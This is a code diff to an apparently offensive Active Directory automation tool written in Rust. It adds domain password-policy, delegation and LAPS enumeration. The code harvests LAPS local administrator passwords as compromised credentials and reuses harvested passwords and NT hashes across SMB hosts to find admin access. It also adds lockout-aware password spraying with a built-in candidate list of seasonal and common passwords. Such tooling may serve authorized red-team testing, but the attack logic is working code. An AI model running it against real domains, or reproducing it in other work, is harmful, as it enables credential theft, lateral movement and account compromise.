@@ -5,11 +5,11 @@
 //! overthrone-core, overthrone-hunter, overthrone-crawler, etc.
 
 use crate::goals::{
-    CompromisedCred, DelegationInfo, DiscoveredComputer, DiscoveredUser, EngagementState, LootItem,
-    SecretType,
+    CompromisedCred, DelegationInfo, DiscoveredComputer, DiscoveredUser, EngagementState, GpoInfo,
+    LapsInfo, LootItem, PasswordPolicyInfo, SecretType,
 };
 use crate::planner::{PlanStep, PlannedAction, StepResult};
-use chrono::Utc;
+use chrono::{Datelike, Utc};
 use colored::Colorize;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::exec::smbexec::escape_cmd_metacharacters;
@@ -19,7 +19,7 @@ use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod};
 use overthrone_hunter::constrained::ConstrainedConfig;
 use overthrone_hunter::rbcd::RbcdConfig;
 use overthrone_hunter::unconstrained::UnconstrainedConfig;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::path::PathBuf;
 use tracing::{debug, info, warn};
 // ═══════════════════════════════════════════════════════════
@@ -130,6 +130,9 @@ pub async fn execute_step(
             | PlannedAction::EnumerateGroups
             | PlannedAction::EnumerateTrusts
             | PlannedAction::EnumerateGpos
+            | PlannedAction::EnumeratePasswordPolicy
+            | PlannedAction::EnumerateDelegations
+            | PlannedAction::EnumerateLaps
             | PlannedAction::AdcsEnumerate
             | PlannedAction::AdcsEsc4 { .. }
     );
@@ -151,6 +154,9 @@ pub async fn execute_step(
         PlannedAction::EnumerateGroups => exec_enumerate_groups(ctx, state).await,
         PlannedAction::EnumerateTrusts => exec_enumerate_trusts(ctx, state).await,
         PlannedAction::EnumerateGpos => exec_enumerate_gpos(ctx, state).await,
+        PlannedAction::EnumeratePasswordPolicy => exec_enumerate_password_policy(ctx, state).await,
+        PlannedAction::EnumerateDelegations => exec_enumerate_delegations(ctx, state).await,
+        PlannedAction::EnumerateLaps => exec_enumerate_laps(ctx, state).await,
         PlannedAction::EnumerateShares { target } => {
             exec_enumerate_shares(ctx, state, target).await
         }
@@ -367,6 +373,261 @@ async fn smb_connect(
     })
 }
 
+#[derive(Debug, Clone)]
+struct SmbAttempt {
+    domain: String,
+    username: String,
+    secret: String,
+    use_hash: bool,
+    source: String,
+}
+
+async fn smb_connect_as(
+    target: &str,
+    attempt: &SmbAttempt,
+) -> std::result::Result<SmbSession, StepResult> {
+    let result = if attempt.use_hash {
+        SmbSession::connect_with_hash(target, &attempt.domain, &attempt.username, &attempt.secret)
+            .await
+    } else {
+        SmbSession::connect(target, &attempt.domain, &attempt.username, &attempt.secret).await
+    };
+    result.map_err(|e| StepResult {
+        success: false,
+        output: format!(
+            "SMB connect to {} as {}\\{}: {e}",
+            target, attempt.domain, attempt.username
+        ),
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    })
+}
+
+fn smb_attempts(ctx: &ExecContext, state: &EngagementState) -> Vec<SmbAttempt> {
+    let (user, secret, use_hash) = ctx.effective_creds();
+    let mut seen = HashSet::new();
+    let mut attempts = Vec::new();
+
+    push_smb_attempt(
+        &mut attempts,
+        &mut seen,
+        SmbAttempt {
+            domain: ctx.domain.clone(),
+            username: user.to_string(),
+            secret: secret.to_string(),
+            use_hash,
+            source: "current".to_string(),
+        },
+    );
+
+    for cred in state.credentials.values() {
+        push_smb_attempt(
+            &mut attempts,
+            &mut seen,
+            SmbAttempt {
+                domain: domain_for_smb_user(&ctx.domain, &cred.username),
+                username: normalize_smb_username(&cred.username),
+                secret: cred.secret.clone(),
+                use_hash: cred.secret_type == SecretType::NtHash,
+                source: cred.source.clone(),
+            },
+        );
+    }
+
+    attempts
+}
+
+fn push_smb_attempt(
+    attempts: &mut Vec<SmbAttempt>,
+    seen: &mut HashSet<String>,
+    attempt: SmbAttempt,
+) {
+    if attempt.secret.is_empty() {
+        return;
+    }
+    let key = format!(
+        "{}\\{}:{}:{}",
+        attempt.domain.to_ascii_lowercase(),
+        attempt.username.to_ascii_lowercase(),
+        attempt.secret,
+        attempt.use_hash
+    );
+    if seen.insert(key) {
+        attempts.push(attempt);
+    }
+}
+
+fn domain_for_smb_user(default_domain: &str, username: &str) -> String {
+    username
+        .split_once('\\')
+        .map(|(domain, _)| domain.to_string())
+        .unwrap_or_else(|| default_domain.to_string())
+}
+
+fn normalize_smb_username(username: &str) -> String {
+    username
+        .split_once('\\')
+        .map(|(_, user)| user.to_string())
+        .unwrap_or_else(|| username.to_string())
+}
+
+async fn load_user_telemetry(
+    conn: &mut ldap::LdapSession,
+) -> HashMap<String, HashMap<String, Vec<String>>> {
+    let attrs = &[
+        "sAMAccountName",
+        "badPwdCount",
+        "badPwdTime",
+        "lockoutTime",
+        "logonCount",
+        "pwdLastSet",
+        "lastLogonTimestamp",
+        "userPrincipalName",
+    ];
+    match conn
+        .custom_search("(&(objectCategory=person)(objectClass=user))", attrs)
+        .await
+    {
+        Ok(entries) => entries
+            .into_iter()
+            .filter_map(|entry| {
+                let sam = first_attr(&entry.attrs, "sAMAccountName")?;
+                Some((sam.to_ascii_lowercase(), entry.attrs))
+            })
+            .collect(),
+        Err(e) => {
+            warn!("[users] badPwd/logon telemetry query failed: {e}");
+            HashMap::new()
+        }
+    }
+}
+
+fn first_attr(attrs: &HashMap<String, Vec<String>>, key: &str) -> Option<String> {
+    attrs.get(key).and_then(|values| values.first().cloned())
+}
+
+fn first_u32(attrs: &HashMap<String, Vec<String>>, key: &str) -> Option<u32> {
+    first_attr(attrs, key).and_then(|value| value.parse().ok())
+}
+
+fn first_i64(attrs: &HashMap<String, Vec<String>>, key: &str) -> Option<i64> {
+    first_attr(attrs, key).and_then(|value| value.parse().ok())
+}
+
+fn first_interval(attrs: &HashMap<String, Vec<String>>, key: &str) -> Option<String> {
+    first_attr(attrs, key).and_then(|value| windows_interval_to_string(&value))
+}
+
+fn windows_interval_to_string(raw: &str) -> Option<String> {
+    let ticks = raw.parse::<i64>().ok()?;
+    if ticks == 0 {
+        return Some("0m".to_string());
+    }
+    if ticks == i64::MIN {
+        return Some("never".to_string());
+    }
+
+    let total_seconds = ticks.unsigned_abs() / 10_000_000;
+    let days = total_seconds / 86_400;
+    let hours = (total_seconds % 86_400) / 3_600;
+    let minutes = (total_seconds % 3_600) / 60;
+
+    Some(if days > 0 {
+        format!("{days}d {hours}h")
+    } else if hours > 0 {
+        format!("{hours}h {minutes}m")
+    } else {
+        format!("{minutes}m")
+    })
+}
+
+#[derive(Debug, Default)]
+struct ParsedLapsV2 {
+    username: Option<String>,
+    password: Option<String>,
+    expiration: Option<String>,
+}
+
+fn parse_laps_v2(blob: &str) -> ParsedLapsV2 {
+    let Ok(value) = serde_json::from_str::<serde_json::Value>(blob) else {
+        return ParsedLapsV2::default();
+    };
+    let get_string = |key: &str| {
+        value
+            .get(key)
+            .and_then(|v| v.as_str())
+            .map(|v| v.to_string())
+    };
+
+    ParsedLapsV2 {
+        username: get_string("n")
+            .or_else(|| get_string("account"))
+            .or_else(|| get_string("Account")),
+        password: get_string("p")
+            .or_else(|| get_string("password"))
+            .or_else(|| get_string("Password")),
+        expiration: get_string("t")
+            .or_else(|| get_string("expiration"))
+            .or_else(|| get_string("Expiration")),
+    }
+}
+
+fn select_spray_password(state: &EngagementState) -> Option<String> {
+    let now = Utc::now();
+    let year = now.year();
+    let current = season_for_month(now.month());
+    let candidates = [
+        format!("{current}{year}!"),
+        format!("{current}{year}"),
+        format!("Winter{year}!"),
+        format!("Summer{year}!"),
+        format!("Spring{year}!"),
+        format!("Fall{year}!"),
+        format!("Autumn{year}!"),
+        "Password1!".to_string(),
+        "Welcome1!".to_string(),
+        "P@ssw0rd!".to_string(),
+    ];
+    candidates
+        .into_iter()
+        .find(|candidate| password_fits_policy(state, candidate))
+}
+
+fn season_for_month(month: u32) -> &'static str {
+    match month {
+        12 | 1 | 2 => "Winter",
+        3..=5 => "Spring",
+        6..=8 => "Summer",
+        _ => "Fall",
+    }
+}
+
+fn password_fits_policy(state: &EngagementState, candidate: &str) -> bool {
+    let Some(policy) = &state.password_policy else {
+        return true;
+    };
+    if let Some(min_len) = policy.min_password_length
+        && candidate.chars().count() < min_len as usize
+    {
+        return false;
+    }
+    if policy.password_complexity_enabled {
+        let has_upper = candidate.chars().any(|c| c.is_ascii_uppercase());
+        let has_lower = candidate.chars().any(|c| c.is_ascii_lowercase());
+        let has_digit = candidate.chars().any(|c| c.is_ascii_digit());
+        let has_symbol = candidate.chars().any(|c| !c.is_ascii_alphanumeric());
+        if [has_upper, has_lower, has_digit, has_symbol]
+            .into_iter()
+            .filter(|v| *v)
+            .count()
+            < 3
+        {
+            return false;
+        }
+    }
+    true
+}
+
 // ═══════════════════════════════════════════════════════════
 // Enumeration Executors
 // ═══════════════════════════════════════════════════════════
@@ -389,10 +650,16 @@ async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) ->
         }
     };
 
+    let user_telemetry = load_user_telemetry(&mut conn).await;
     let _ = conn.disconnect().await;
 
     let mut user_count = 0;
+    state.users.clear();
+    state.kerberoastable.clear();
+    state.asrep_roastable.clear();
+    state.spn_map.clear();
     for u in &ad_users {
+        let telemetry = user_telemetry.get(&u.sam_account_name.to_ascii_lowercase());
         if !u.service_principal_names.is_empty()
             && u.sam_account_name.to_lowercase() != "krbtgt"
             && !u.sam_account_name.ends_with("$")
@@ -414,17 +681,27 @@ async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) ->
             dont_req_preauth: u.dont_req_preauth,
             enabled: u.enabled,
             description: u.description.clone(),
+            bad_pwd_count: telemetry.and_then(|attrs| first_u32(attrs, "badPwdCount")),
+            bad_pwd_time: telemetry.and_then(|attrs| first_attr(attrs, "badPwdTime")),
+            lockout_time: telemetry.and_then(|attrs| first_attr(attrs, "lockoutTime")),
+            logon_count: telemetry.and_then(|attrs| first_u32(attrs, "logonCount")),
+            pwd_last_set: telemetry.and_then(|attrs| first_attr(attrs, "pwdLastSet")),
+            last_logon_timestamp: telemetry
+                .and_then(|attrs| first_attr(attrs, "lastLogonTimestamp")),
+            user_principal_name: telemetry.and_then(|attrs| first_attr(attrs, "userPrincipalName")),
         });
         user_count += 1;
     }
 
     let admin_users = state.users.iter().filter(|u| u.admin_count).count();
+    let lockout_risk = state.users_near_lockout();
     let msg = format!(
-        "Enumerated {} users ({} admin, {} kerberoastable, {} AS-REP)",
+        "Enumerated {} users ({} admin, {} kerberoastable, {} AS-REP, {} lockout-risk)",
         user_count,
         admin_users,
         state.kerberoastable.len(),
-        state.asrep_roastable.len()
+        state.asrep_roastable.len(),
+        lockout_risk
     );
     info!("{} {}", "  ✓".green(), msg);
     StepResult {
@@ -625,6 +902,7 @@ async fn exec_enumerate_trusts(ctx: &ExecContext, state: &mut EngagementState) -
             t.trust_partner, t.trust_direction, t.trust_type
         ));
     }
+    state.trusts = trust_info.clone();
 
     let msg = format!(
         "Enumerated {} domain trusts: [{}]",
@@ -648,7 +926,15 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, state: &mut EngagementState) -> 
 
     // Query groupPolicyContainer objects
     let filter = "(objectClass=groupPolicyContainer)";
-    let attrs = &["displayName", "gPCFileSysPath", "cn", "whenChanged"];
+    let attrs = &[
+        "displayName",
+        "gPCFileSysPath",
+        "cn",
+        "whenChanged",
+        "flags",
+        "versionNumber",
+        "distinguishedName",
+    ];
     let entries = match conn.custom_search(filter, attrs).await {
         Ok(e) => e,
         Err(e) => {
@@ -665,18 +951,34 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, state: &mut EngagementState) -> 
     let _ = conn.disconnect().await;
 
     let mut gpo_names = Vec::new();
+    let mut gpo_details = Vec::new();
     for entry in &entries {
-        if let Some(name) = entry.attrs.get("displayName").and_then(|v| v.first()) {
-            let sysvol = entry
-                .attrs
-                .get("gPCFileSysPath")
-                .and_then(|v| v.first())
-                .cloned()
-                .unwrap_or_default();
-            info!("  {} {} → {}", "⤷".cyan(), name.bold(), sysvol.dimmed());
-            gpo_names.push(name.clone());
-        }
+        let name = first_attr(&entry.attrs, "displayName")
+            .or_else(|| first_attr(&entry.attrs, "cn"))
+            .unwrap_or_else(|| entry.dn.clone());
+        let sysvol = first_attr(&entry.attrs, "gPCFileSysPath");
+        let flags = first_u32(&entry.attrs, "flags");
+        info!(
+            "  {} {} -> {}",
+            "⤷".cyan(),
+            name.bold(),
+            sysvol.as_deref().unwrap_or("(no SYSVOL path)").dimmed()
+        );
+        gpo_names.push(name.clone());
+        gpo_details.push(GpoInfo {
+            name,
+            distinguished_name: first_attr(&entry.attrs, "distinguishedName")
+                .or_else(|| Some(entry.dn.clone())),
+            sysvol_path: sysvol,
+            flags,
+            version: first_u32(&entry.attrs, "versionNumber"),
+            when_changed: first_attr(&entry.attrs, "whenChanged"),
+            user_settings_disabled: flags.map(|v| v & 0x1 != 0).unwrap_or(false),
+            computer_settings_disabled: flags.map(|v| v & 0x2 != 0).unwrap_or(false),
+        });
     }
+    state.gpos = gpo_names.clone();
+    state.gpo_details = gpo_details;
 
     let msg = format!(
         "Enumerated {} GPOs: [{}]",
@@ -688,6 +990,261 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, state: &mut EngagementState) -> 
         success: true,
         output: msg,
         new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
+async fn exec_enumerate_password_policy(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let attrs = &[
+        "minPwdLength",
+        "lockoutThreshold",
+        "lockoutDuration",
+        "lockOutObservationWindow",
+        "maxPwdAge",
+        "minPwdAge",
+        "pwdHistoryLength",
+        "pwdProperties",
+    ];
+    let base_dn = ctx.base_dn();
+    let entries = match conn
+        .custom_search_with_base(&base_dn, "(objectClass=domainDNS)", attrs)
+        .await
+    {
+        Ok(e) => e,
+        Err(e) => {
+            let _ = conn.disconnect().await;
+            return StepResult {
+                success: false,
+                output: format!("Password policy enum failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+
+    let fine_grained = conn
+        .custom_search("(objectClass=msDS-PasswordSettings)", &["cn"])
+        .await
+        .map(|entries| entries.len())
+        .unwrap_or(0);
+    let _ = conn.disconnect().await;
+
+    let Some(entry) = entries.first() else {
+        return StepResult {
+            success: false,
+            output: "Password policy enum returned no domainDNS object".to_string(),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        };
+    };
+
+    let pwd_properties = first_i64(&entry.attrs, "pwdProperties").unwrap_or(0);
+    state.password_policy = Some(PasswordPolicyInfo {
+        min_password_length: first_u32(&entry.attrs, "minPwdLength"),
+        lockout_threshold: first_u32(&entry.attrs, "lockoutThreshold"),
+        lockout_duration: first_interval(&entry.attrs, "lockoutDuration"),
+        lockout_observation_window: first_interval(&entry.attrs, "lockOutObservationWindow"),
+        max_password_age: first_interval(&entry.attrs, "maxPwdAge"),
+        min_password_age: first_interval(&entry.attrs, "minPwdAge"),
+        password_history_length: first_u32(&entry.attrs, "pwdHistoryLength"),
+        password_complexity_enabled: pwd_properties & 0x1 != 0,
+        reversible_encryption_enabled: pwd_properties & 0x10 != 0,
+        fine_grained_policy_count: fine_grained,
+    });
+
+    let policy = state.password_policy.as_ref().unwrap();
+    let msg = format!(
+        "Password policy: min_len={:?}, lockout_threshold={:?}, observation={:?}, fine_grained={}",
+        policy.min_password_length,
+        policy.lockout_threshold,
+        policy.lockout_observation_window,
+        policy.fine_grained_policy_count
+    );
+    info!("{} {}", "  ✓".green(), msg);
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
+async fn exec_enumerate_delegations(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let filter = "(|(&(objectCategory=person)(objectClass=user))(&(objectCategory=computer)(objectClass=computer)))";
+    let attrs = &[
+        "sAMAccountName",
+        "distinguishedName",
+        "userAccountControl",
+        "msDS-AllowedToDelegateTo",
+        "msDS-AllowedToActOnBehalfOfOtherIdentity",
+    ];
+    let entries = match conn.custom_search(filter, attrs).await {
+        Ok(e) => e,
+        Err(e) => {
+            let _ = conn.disconnect().await;
+            return StepResult {
+                success: false,
+                output: format!("Delegation enum failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+    let _ = conn.disconnect().await;
+
+    state.constrained_delegation.clear();
+    state.unconstrained_delegation.clear();
+    state.rbcd_targets.clear();
+
+    for entry in &entries {
+        let account =
+            first_attr(&entry.attrs, "sAMAccountName").unwrap_or_else(|| entry.dn.clone());
+        let uac = first_u32(&entry.attrs, "userAccountControl").unwrap_or(0);
+        let targets = entry
+            .attrs
+            .get("msDS-AllowedToDelegateTo")
+            .cloned()
+            .unwrap_or_default();
+        if !targets.is_empty() {
+            state.constrained_delegation.push(DelegationInfo {
+                account: account.clone(),
+                delegation_type: "constrained".to_string(),
+                targets,
+                protocol_transition: uac & 0x1000000 != 0,
+            });
+        }
+        if uac & 0x80000 != 0 {
+            state.unconstrained_delegation.push(account.clone());
+        }
+        if entry
+            .attrs
+            .contains_key("msDS-AllowedToActOnBehalfOfOtherIdentity")
+        {
+            state.rbcd_targets.push(account);
+        }
+    }
+
+    let msg = format!(
+        "Delegation enum: {} constrained, {} unconstrained, {} RBCD targets",
+        state.constrained_delegation.len(),
+        state.unconstrained_delegation.len(),
+        state.rbcd_targets.len()
+    );
+    info!("{} {}", "  ✓".green(), msg);
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
+async fn exec_enumerate_laps(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let entries = match conn.read_laps_passwords(None).await {
+        Ok(e) => e,
+        Err(e) => {
+            let _ = conn.disconnect().await;
+            return StepResult {
+                success: false,
+                output: format!("LAPS enum failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+    let _ = conn.disconnect().await;
+
+    state.laps.clear();
+    let mut new_creds = 0;
+    for entry in entries {
+        let computer_name = entry.computer_name.trim_end_matches('$').to_string();
+        if let Some(password) = entry.password.clone() {
+            let username = format!("{computer_name}\\Administrator");
+            state.laps.push(LapsInfo {
+                computer_name: entry.computer_name.clone(),
+                dns_name: Some(entry.dns_name.clone()).filter(|v| !v.is_empty()),
+                username: username.clone(),
+                password: Some(password.clone()),
+                expiration: entry.expiration.clone(),
+                source: "laps_v1".to_string(),
+                readable: true,
+            });
+            state.add_credential(CompromisedCred {
+                username,
+                secret: password,
+                secret_type: SecretType::Password,
+                source: "laps_v1".to_string(),
+                is_admin: true,
+                admin_on: vec![if entry.dns_name.is_empty() {
+                    computer_name.clone()
+                } else {
+                    entry.dns_name.clone()
+                }],
+            });
+            new_creds += 1;
+        }
+
+        if let Some(blob) = entry.laps_v2_password.clone() {
+            let parsed = parse_laps_v2(&blob);
+            let username = parsed
+                .username
+                .clone()
+                .unwrap_or_else(|| format!("{computer_name}\\Administrator"));
+            state.laps.push(LapsInfo {
+                computer_name: entry.computer_name.clone(),
+                dns_name: Some(entry.dns_name.clone()).filter(|v| !v.is_empty()),
+                username: username.clone(),
+                password: parsed.password.clone(),
+                expiration: parsed.expiration.clone().or(entry.expiration.clone()),
+                source: "laps_v2".to_string(),
+                readable: parsed.password.is_some(),
+            });
+            if let Some(password) = parsed.password {
+                state.add_credential(CompromisedCred {
+                    username,
+                    secret: password,
+                    secret_type: SecretType::Password,
+                    source: "laps_v2".to_string(),
+                    is_admin: true,
+                    admin_on: vec![if entry.dns_name.is_empty() {
+                        computer_name.clone()
+                    } else {
+                        entry.dns_name.clone()
+                    }],
+                });
+                new_creds += 1;
+            }
+        }
+    }
+
+    let msg = format!(
+        "LAPS enum: {} readable entries, {} local admin credentials added",
+        state.readable_laps_count(),
+        new_creds
+    );
+    info!("{} {}", "  ✓".green(), msg);
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: new_creds,
         new_admin_hosts: 0,
     }
 }
@@ -731,19 +1288,41 @@ async fn exec_check_admin(
     targets: &[String],
 ) -> StepResult {
     let mut new_admin = 0;
+    let attempts = smb_attempts(ctx, state);
 
     for target in targets {
-        match smb_connect(ctx, target).await {
-            Ok(smb) => {
-                let result = smb.check_admin_access().await;
-                if result.has_admin {
-                    state.admin_hosts.insert(target.clone());
-                    new_admin += 1;
-                    info!("  {} Admin on {}", "✓".green(), target.bold());
+        for attempt in &attempts {
+            match smb_connect_as(target, attempt).await {
+                Ok(smb) => {
+                    let result = smb.check_admin_access().await;
+                    if result.has_admin {
+                        let was_new = state.admin_hosts.insert(target.clone());
+                        if was_new {
+                            new_admin += 1;
+                        }
+                        mark_credential_admin(state, attempt, target);
+                        info!(
+                            "  {} Admin on {} via {}\\{} ({})",
+                            "✓".green(),
+                            target.bold(),
+                            attempt.domain,
+                            attempt.username,
+                            attempt.source
+                        );
+                        break;
+                    } else {
+                        debug!(
+                            "  ✗ {} — auth ok but no admin via {}\\{}",
+                            target, attempt.domain, attempt.username
+                        );
+                    }
                 }
-            }
-            Err(e) => {
-                debug!("  ✗ {} — {}", target, e.output);
+                Err(e) => {
+                    debug!(
+                        "  ✗ {} — {}\\{} ({}) — {}",
+                        target, attempt.domain, attempt.username, attempt.source, e.output
+                    );
+                }
             }
         }
         ctx.jitter().await;
@@ -755,6 +1334,19 @@ async fn exec_check_admin(
         output: msg,
         new_credentials: 0,
         new_admin_hosts: new_admin,
+    }
+}
+
+fn mark_credential_admin(state: &mut EngagementState, attempt: &SmbAttempt, target: &str) {
+    for cred in state.credentials.values_mut() {
+        if normalize_smb_username(&cred.username).eq_ignore_ascii_case(&attempt.username)
+            && cred.secret == attempt.secret
+        {
+            cred.is_admin = true;
+            if !cred.admin_on.iter().any(|host| host == target) {
+                cred.admin_on.push(target.to_string());
+            }
+        }
     }
 }
 
@@ -1693,14 +2285,47 @@ async fn exec_password_spray(
     users: &[String],
     password: &str,
 ) -> StepResult {
+    let password = if password.trim().is_empty() {
+        match select_spray_password(state) {
+            Some(candidate) => candidate,
+            None => {
+                let msg =
+                    "Spray skipped: no policy-compatible seasonal password candidate".to_string();
+                return StepResult {
+                    success: true,
+                    output: msg,
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        }
+    } else {
+        password.to_string()
+    };
+    let safe_users: HashSet<String> = state.safe_spray_candidates().into_iter().collect();
+    let target_users: Vec<String> = users
+        .iter()
+        .filter(|user| safe_users.is_empty() || safe_users.contains(*user))
+        .cloned()
+        .collect();
+    if target_users.is_empty() {
+        let msg = format!("Spray skipped: {}", state.spray_risk_summary());
+        return StepResult {
+            success: true,
+            output: msg,
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        };
+    }
+
     let mut success_count = 0;
-    for user in users {
-        match kerberos::request_tgt(&ctx.dc_ip, &ctx.domain, user, password, false).await {
+    for user in &target_users {
+        match kerberos::request_tgt(&ctx.dc_ip, &ctx.domain, user, &password, false).await {
             Ok(_) => {
                 info!("  {} VALID: {}:{}", "✓".green(), user.bold(), password);
                 state.add_credential(CompromisedCred {
                     username: user.clone(),
-                    secret: password.to_string(),
+                    secret: password.clone(),
                     secret_type: SecretType::Password,
                     source: "password_spray".to_string(),
                     is_admin: false,
@@ -1715,7 +2340,12 @@ async fn exec_password_spray(
         ctx.jitter().await;
     }
 
-    let msg = format!("Spray: {}/{} valid", success_count, users.len());
+    let msg = format!(
+        "Spray: {}/{} valid using one policy-aware candidate ({})",
+        success_count,
+        target_users.len(),
+        state.spray_risk_summary()
+    );
     StepResult {
         success: success_count > 0,
         output: msg,
